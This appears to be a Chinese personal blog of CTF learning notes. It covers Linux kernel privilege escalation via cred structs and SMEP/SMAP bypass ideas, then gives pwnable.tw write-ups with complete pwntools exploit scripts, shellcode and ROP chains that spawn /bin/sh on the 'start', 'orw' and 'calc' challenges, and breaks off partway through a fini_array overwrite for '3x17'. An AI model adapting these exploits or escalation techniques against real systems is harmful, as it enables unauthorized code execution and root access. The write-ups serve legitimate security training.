<h4 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h4><p>kernel调度着所有系统资源，进程也是资源，也归kernel管，管理的策略就是使用结构体 <code>task_struct</code> 记录进程信息，每个<code>task_struct</code>都记录着一个进程的信息，其中又有专门的结构体cred记录程序的权限，每个程序都有一个cred结构，如果能修改对应进程的cred，那也就能修改这个进程的权限了，结构体源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h4 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h4><p>进程提权主要依靠两个协力完成。</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong>，假如传入的是null，那函数就会返回一个root权限的cred.</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>
</ul>
<p>通过commit_creds(prepare_kernel_cred(NULL))这套组合拳就能把用户态进程的cred更新为一个root的cred.</p>
<p>（也有可能直接溢出改，我猜的，毕竟还没做过题😃）</p>
<h4 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h4><p><strong>KASLR</strong>：内核地址随机化，和aslr类似，知道了一个地址再加上一个偏移就能知道基地址了，在没开启KASLR的时候，内核的基地址是0xffffffff81000000</p>
<p><strong>STACK PROTECTOR</strong>：和canary类似，用以检测是否发生了内核堆栈溢出，如果发生内核堆栈溢出则会产生kernel panic.</p>
<p><strong>SMAP/SMEP</strong>:smap的作用时阻止内核空间直接访问用户空间的数据，smep用以阻止内核空间执行用户空间的数据。目的是让内核空间和用户空间完全隔开。</p>
<p>一共有两种绕过（照搬）</p>
<ul>
<li>在设计中，为了使隔离的数据进行交换时具有更高的性能，隐性地址共享始终存在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐性内存共享可以完整的绕过软件和硬件的隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mapped memory ）</li>
<li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行ret2usr</li>
</ul>
<p><strong>KPTI</strong>：KPTI即<code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化（完全没理解）</p>
<h4 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h4><p>可装载内核模块，简称LKMs,顾名思义就是内核中可装载可拆卸的程序，可以提供内核原本不具备的服务又不至于重新更新整个系统的东西，一般的kernelpwn题的漏洞都是出在出题人自己写的lkms上面。</p>
<ul>
<li><code>lsmod</code>：列出现有的LKMs</li>
<li><code>insmod</code>：装载新的LKM（需要root）</li>
<li><code>rmmod</code>：从内核中移除LKM（需要root）</li>
</ul>
<h4 id="内核态函数调用-照搬"><a href="#内核态函数调用-照搬" class="headerlink" title="内核态函数调用(照搬)"></a>内核态函数调用(照搬)</h4><ol>
<li><code>printf()</code>变更为**<code>printk()</code>**，但需要注意的是<code>printk()</code><strong>不一定会把内容显示到终端上，但一定在内核缓冲区里</strong>，可以通过 <code>dmesg</code> 查看效果。</li>
<li><code>memcpy()</code>变更为<code>copy_from_user()/copy_to_user()</code><ul>
<li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li>
<li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
</ul>
</li>
<li><code>malloc()</code>变更为**<code>kmalloc()</code>**，内核态的内存分配函数，和<code>malloc()</code>相似，但使用的是 <code>slab/slub</code> 分配器</li>
<li><code>free()</code>变更为**<code>kfree()</code>**，同 <code>kmalloc()</code></li>
</ol>
<p>对内核的搭建和认识就到这了，下面进入实战阶段</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/pwnable.tw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/04/pwnable.tw/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-04 00:44:12" itemprop="dateCreated datePublished" datetime="2022-02-04T00:44:12+08:00">2022-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-08 23:16:24" itemprop="dateModified" datetime="2022-02-08T23:16:24+08:00">2022-02-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>title: pwnable.tw<br>date: 2021-11-26 16:02:02<br>tags:</p>
<h1 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h1><p>开始刷pwnable.tw的题，看界面挺酷的，感觉非常有难度，希望能坚持的久一点。</p>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>保护全关，直接栈上写汇编就行，不过不能使用shellcraft.sh()，这个太大，自己写个汇编就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./start&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08048097&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">5</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let\&#x27;s start the CTF:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">stact_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">4</span>+<span class="number">4</span>*<span class="number">5</span>+<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stact_addr)</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 11</span></span><br><span class="line"><span class="string">mov ebx, &#123;0&#125;</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(stact_addr-<span class="number">4</span>-<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">4</span>*<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>)+p32(stact_addr)+shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>写的可能有点麻烦，但大概流程就是泄露栈地址，然后直接asm,这个程序有意思的地方是只有两个函数start和exit,一般程序启动时的调用过程是这样的，_start<code>-&gt; </code>__libc_start_main<code>-&gt;</code>main，其中start和libc_start_mian是gcc汇编的时候加进去的。</p>
<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>接收一个shellocde直接执行，没啥东西，不过这个是在段上执行，在本地竟然没办法执行也不知道为啥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./orw&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x0804858A&#x27;)</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">mov ebx, 0x804a100</span></span><br><span class="line"><span class="string">mov ecx, 0</span></span><br><span class="line"><span class="string">mov edx, 0</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov eax, 3</span></span><br><span class="line"><span class="string">mov ebx, 3</span></span><br><span class="line"><span class="string">mov ecx, 0x804a160</span></span><br><span class="line"><span class="string">mov edx, 0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov eax, 4</span></span><br><span class="line"><span class="string">mov ebx, 1</span></span><br><span class="line"><span class="string">mov ecx, 0x804a160</span></span><br><span class="line"><span class="string">mov edx, 0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&#x27;/home/orw/flag\x00&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>系统调用时i386和amd64接收参数的寄存器不一样，amd64接收前三位参数的寄存器分别是’rdi,rsi,rdx’,i386是’ebx,ecx,edx’，平时的i386函数调用参数是放在栈上的。</p>
<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p>看源码看得我头皮发麻，看别人的wp也看的我头皮发麻，应该不是我现在水平能做的，以后再回来填坑吧。</p>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>代码比较复杂，看了快两个小时才看懂算法的整个策略，前半个多小时不知道calc是计算器的意思，看了老半天都没看懂这个程序是要干啥的，后面才知道calc是计算的意思，这个程序就是完成一个简单的计算器，策略是当前符号是+或者-则算上一次的符号，然后把当前符号压栈，如果是%,*,/就看上一次符号是不是+,-,如果是的话，把当前符号压栈，如果不是的话算上一次的符号，然后把当前符号压栈。策略是搞清楚了，但是漏洞还没找见🤦‍♀️🤦‍♀️🤦‍♀️🤦‍♀️</p>
<p>发现了一个盲点，表达式的第一个值可以是符号，我稍微试了一下，当出现’-8-8’，就会发生段错误，😃😃😃有比较明确的思路了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+360+1</span><br><span class="line">-5105367</span><br><span class="line"></span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure>

<p>历时五六个小时，终于做出来了，漏洞就是上面那个样子，不过得巧妙利用才行，最后修改calc函数的返回地址为构造的rop,最后成功getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./calc&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x08049433&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x08049a21: int 0x80;</span></span><br><span class="line"><span class="string">0x0805c34b: pop eax; ret;</span></span><br><span class="line"><span class="string">0x08070880: int 0x80; ret; </span></span><br><span class="line"><span class="string">0x080481d1: pop ebx; ret;</span></span><br><span class="line"><span class="string">0x080701d1: pop ecx; pop ebx; ret; </span></span><br><span class="line"><span class="string">0x080701aa: pop edx; ret;</span></span><br><span class="line"><span class="string">0x080bc4f6: pop esp; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_eax=<span class="number">0x0805c34b</span></span><br><span class="line">pop_esp=<span class="number">0x080bc4f6</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x080701d1</span></span><br><span class="line">int80=<span class="number">0x08070880</span></span><br><span class="line">pop_edx=<span class="number">0x080701aa</span></span><br><span class="line">bss_addr=<span class="number">0x80eb000</span></span><br><span class="line">rop_read=[pop_eax,<span class="number">3</span>,pop_ecx_ebx,bss_addr,<span class="number">0</span>,pop_edx,<span class="number">0x50</span>,int80,pop_esp,bss_addr+<span class="number">0x10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_build</span>(<span class="params">rop</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;+360+1&#x27;</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop)):</span><br><span class="line">        m=<span class="number">361</span>+i</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;-1&#x27;</span>.<span class="built_in">format</span>(m)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;+&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m,rop[i])</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        payload=<span class="string">&#x27;+&#123;0&#125;-&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m+<span class="number">1</span>,rop[i]-<span class="number">1</span>)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload=<span class="string">&#x27;+360+1&#x27;</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line">    rop_build(rop_read)</span><br><span class="line">    sh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(pop_eax)+p32(<span class="number">11</span>)</span><br><span class="line">    payload+=p32(pop_ecx_ebx)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(pop_edx)+p32(<span class="number">0</span>)</span><br><span class="line">    payload+=p32(int80)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>脚本写的比较复杂，估计几天后我来看也看不懂了，不过至今还没看过别人的wp,都是自己搞出来的😊</p>
<h2 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h2><p>继续开刷，这个程序和上面那个一样也是静态链接，而且还没有符号表，连main函数都是我通过字符串找到的，main函数的代码比较简单，提供了一次任意写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  char *v4; // [rsp+8h] [rbp-28h]</span><br><span class="line">  char buf[<span class="number">24</span>]; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  result = (unsigned __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1u, <span class="string">&quot;addr:&quot;</span>, 5uLL);</span><br><span class="line">    read(<span class="number">0</span>, buf, 0x18uLL);</span><br><span class="line">    v4 = (char *)(<span class="built_in">int</span>)sub_40EE70((__int64)buf);</span><br><span class="line">    write(1u, <span class="string">&quot;data:&quot;</span>, 5uLL);</span><br><span class="line">    read(<span class="number">0</span>, v4, 0x18uLL);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(0x28u) != v6 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是静态链接，所以没有plt和got,没法直接改函数地址完成攻击，难搞。🤦‍♀️</p>
<p>看了快两个小时没有看出来应该用这个任意写怎么攻击这个程序，看了别人的博客恍然大悟，原来是改fini_array的值，类似的题我之前在攻防世界上看过，但是没有这个难，那个就是改fini_array的一个指针为后门函数的地址然后调用，这个没有后门函数，就算有因为没有符号表你也看不出来，而且都还是syscall调用，也不能写shellcode，只能rop,能想到这其实也只是开头，最难的还是怎么构造rop，且容我从头细细道来。</p>
<h3 id="如何控制程序流"><a href="#如何控制程序流" class="headerlink" title="如何控制程序流"></a>如何控制程序流</h3><p>在第一道题就已经初步了解过程序并不是直接调用main函数的，gcc编译的时候会在还会添加额外的函数，编译过后程序的调用过程是这样的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt;  main -&gt; __libc_csu__fini.</span><br></pre></td></tr></table></figure>

<p>这个程序也是按这个执行的，只不过没有符号表不能立马找见函数，不过可以通过start的调用关系找见，漏洞成因在__libc_csu_init和__libc_csu__fini上面，这两个函数都有一个对应的虚表，一个是init_array,一个是fini_array,里面储存了函数指针，调用这两个函数时就会从自己的虚表的取出函数指针然后跳到这执行，这个虚表是可以更改的，所以可以通过这里拿到程序流了，两个虚表我们能利用的是fini_array,他储存着两个地址，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ini_array:00000000004B40F0 _fini_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:00000000004B40F0                 assume cs:_fini_array</span><br><span class="line">.fini_array:00000000004B40F0                 ;org 4B40F0h</span><br><span class="line">.fini_array:00000000004B40F0 byte_4B40F0     db 0                    ; DATA XREF: sub_4028D0+4C↑o</span><br><span class="line">.fini_array:00000000004B40F0                                         ; sub_402960+8↑o</span><br><span class="line">.fini_array:00000000004B40F1                 db  1Bh</span><br><span class="line">.fini_array:00000000004B40F2                 db  40h ; @</span><br><span class="line">.fini_array:00000000004B40F3                 db    0</span><br><span class="line">.fini_array:00000000004B40F4                 db    0</span><br><span class="line">.fini_array:00000000004B40F5                 db    0</span><br><span class="line">.fini_array:00000000004B40F6                 db    0</span><br><span class="line">.fini_array:00000000004B40F7                 db    0</span><br><span class="line">.fini_array:00000000004B40F8                 db 80h</span><br><span class="line">.fini_array:00000000004B40F9                 db  15h</span><br><span class="line">.fini_array:00000000004B40FA                 db  40h ; @</span><br><span class="line">.fini_array:00000000004B40FB                 db    0</span><br><span class="line">.fini_array:00000000004B40FC                 db    0</span><br><span class="line">.fini_array:00000000004B40FD                 db    0</span><br><span class="line">.fini_array:00000000004B40FE                 db    0</span><br><span class="line">.fini_array:00000000004B40FF                 db    0</span><br><span class="line">.fini_array:00000000004B40FF _fini_array     ends</span><br></pre></td></tr></table></figure>

<p>调用时先调用fini_array[1],然后调用fini_array[0],只要把fini_array[1]写上main函数地址，然后把fini_array[1]写上__libc_csu__fini地址就能循环main函数，达成了多次任意写</p>
<p>由于我们找不见后门函数而且还是静态链接无法得到ogg,所以没办法一次性直接getshell,shellcode也不行，所以只能rop,但是我们不能直接控制rsp,现在问题更新了，该怎么控制rsp,rop又改写到哪。</p>
<p>通过浏览别的wp，他们结合rop的变化提供了一个非常巧妙的控制rop的gadget，_libc_csu_fini的代码大致如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040297D                 lea     rbp, &amp;fini_array</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br></pre></td></tr></table></figure>

